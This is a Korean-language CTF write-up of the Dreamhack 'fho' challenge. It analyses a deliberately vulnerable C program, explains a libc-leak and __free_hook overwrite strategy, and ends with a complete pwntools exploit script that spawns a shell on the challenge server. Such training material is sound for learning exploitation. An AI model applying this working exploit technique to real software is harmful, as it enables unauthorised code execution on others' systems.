# fho - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 2
- Provided Files: fho.c, fho(ELF), libc-2.27.so
- tools: gdb(pwndbg), checksec, readelf
## Brief Description
Exploit Tech: Hook Overwrite에서 실습하는 문제입니다.
## Initial Analysis
### Environment
``` sh
checksec fho
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```
### Code
``` c
// Name: fho.c
// Compile: gcc -o fho fho.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  puts("[2] Arbitary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}
```
## Vulnerability
### BOF(Buffer Overflow) & OOB(Out of Bounds)
``` c
read(0, buf, 0x100); // buf size: 0x30
printf("Buf: %s\n", buf);
```
`buf`의 크기가 0x30인 반면, `read`로 읽어오는 `buf`의 크기는 0x100으로 크게 초과하여 BOF 취약점이 발생한다. 또한 `read` 직후 바로 `printf`로 `buf`의 내용을 %s로 읽어오기 때문에 `buf`를 넘어서는 상위 데이터 leak이 가능하다.  
### Arbitrary Write(임의 주소 쓰기)
``` c
puts("[2] Arbitary-Address-Write");
printf("To write: ");
scanf("%llu", &addr);
printf("With: ");
scanf("%llu", &value);
printf("[%p] = %llu\n", addr, value);
*addr = value;
```
사용자가 임의의 메모리 주소에 원하는 값을 삽입할 수 있다.
### Arbitrary Free(임의 주소 해제)
``` c
puts("[3] Arbitrary-Address-Free");
printf("To free: ");
scanf("%llu", &addr);
free(addr);
```
사용자가 임의의 메모리 주소를 해제할 수 있다.  
### Vulnerability Summary
| Type | Impact |
| --- | --- | 
| BOF & OOB | `buf`를 넘어서 상위 주소의 데이터 leak |
| Arbitrary Write | 임의 주소에 원하는 데이터 삽입 |
| Arbitrary Free | 임의 주소 해제(`free` 호출) |
## Exploit
### Strategy
카나리가 활성화 되어있어 처음부터 BOF 취약점으로 특정 위치에 원하는 값을 삽입하기는 어렵다. 그러나 `buf`를 넘어서는 상위 데이터를 읽어올 수 있으므로 이를 활용하면 `canary`, `main`의 리턴 주소 등을 읽어올 수 있다. 또한 사용자가 원하는 메모리 주소에 값을 삽입하고, 임의 주소를 해제할 수 있다. 그러나 Full RELRO로 인해 `.got`, `.got.plt`에 쓰기 권한이 주어지지 않는다. 이러한 환경을 고려했을 때 `Hook Overwrite` 공격을 시도해 볼 수 있다. `free`의 `__free_hook`이 가리키는 주소를 `system`으로 수정하고, `free`의 인자로 `"/bin/sh"`의 주소를 전달해주면 최종적으로 `system("/bin/sh")`을 호출하게 된다. 공격 흐름은 다음과 같다.  
1. BOF & OOB -> PIE & ASLR 우회를 위해 libc base address leak
2. Arbitrary Write -> `__free_hook`이 가리키는 주소를 `system` 함수의 주소로 수정
3. Arbitrary Free -> `free`의 인자로 `"/bin/sh"`의 주소 전달
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
| ra | 0x8 |
| rbp |  |
| canary | -x08 |
| dummy | -x10 |
| buf | -0x40 |
### Exploitation Steps
``` sh
$ readelf -sr libc-2.27.so | grep " __free_hook@"
0000003eaef0  00dd00000006 R_X86_64_GLOB_DAT 00000000003ed8e8 __free_hook@@GLIBC_2.2.5 + 0
   221: 00000000003ed8e8     8 OBJECT  WEAK   DEFAULT   35 __free_hook@@GLIBC_2.2.5
```
__free_hook 오프셋 = 0x3ed8e8
``` sh
$ readelf -s libc-2.27.so | grep " system@"
  1403: 000000000004f550    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```
system 함수 오프셋 = 0x4f550
``` sh
$ strings -tx libc-2.27.so | grep "/bin/sh"
 1b3e1a /bin/sh
```
"/bin/sh" 오프셋 = 0x1b3e1a
``` sh
$ gdb ./libc-2.27.so
pwndbg> info functions __libc_start_main
pwndbg> disassemble __libc_start_main
...
0x0000000000021bf0 <+224>:   mov    rax,QWORD PTR [rsp+0x18] ; __libc_start_main은 main 주소를 인자로 받아서 호출하므로, 컴파일러는 main 주소를 레지스터나 스택에 저장해뒀다가 간접 호출
0x0000000000021bf5 <+229>:   call   rax ; main 함수 호출
0x0000000000021bf7 <+231>:   mov    edi,eax
...
```
`main` 함수의 `__libc_start_main`의 리턴 오프셋 = `__libc_start_main` + 231
``` sh
$ gdb ./fho
pwndbg> start
pwndbg> main ; 생략 가능
pwndbg> bt
#0  0x00005555554008be in main ()
#1  0x00007ffff7db4d90 in __libc_start_call_main (main=main@entry=0x5555554008ba <main>, argc=argc@entry=1, argv=argv@entry=0x7fffffffe028) at ../sysdeps/nptl/libc_start_call_main.h:58
#2  0x00007ffff7db4e40 in __libc_start_main_impl (main=0x5555554008ba <main>, argc=1, argv=0x7fffffffe028, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffe018) at ../csu/libc-start.c:392
#3  0x00005555554007da in _start ()
```
``` sh
pwndbg> x/i 0x00007ffff7db4d90
   0x7ffff7db4d90 <__libc_start_call_main+128>: mov    edi,eax
```
이건 바이너리가 돌아가는 로컬의 libc가 libc-2.27.so인 경우 해당 바이너리에서 직접 확인 가능  
나의 로컬은 libc-2.27.so가 아니라서 128로 나온다. (로컬 libc를 변경할 수 있지만, 혹시 문제 생길 것 같아서 포기)
### payload
``` python
from pwn import *

p = remote('host8.dreamhack.games', 22575)
context.arch = "amd64"

e = ELF('./fho')
libc = ELF('x64/libc-2.27.so')

# libc base leak
payload = b''
payload += b'A' * 0x48 # have to cover the canary's NULL-byte 
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)

libc_start_main_x = u64(p.recvline()[:-1] + b'\x00' * 2)
libc_base = libc_start_main_x - (libc.symbols['__libc_start_main'] + 231)
log.info(f'libc_base1: {libc_base}') # 직접 찾은 libc base
libc_base = libc_start_main_x - libc.libc_start_main_return
log.info(f'libc_base2: {libc_base}') # pwntool로 찾은 libc base
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
binsh = libc_base + next(libc.search(b'/bin/sh'))

# debug
log.info(f'system: {system}')
log.info(f'free_hook: {free_hook}')
log.info(f'binsh: {binsh}')

# __free_hook Overwrite
p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(system).encode())

# free("/bin/sh") -> call system("/bin/sh")
p.recvuntil('To free: ')
p.sendline(str(binsh).encode())

# interactive
p.interactive()
```

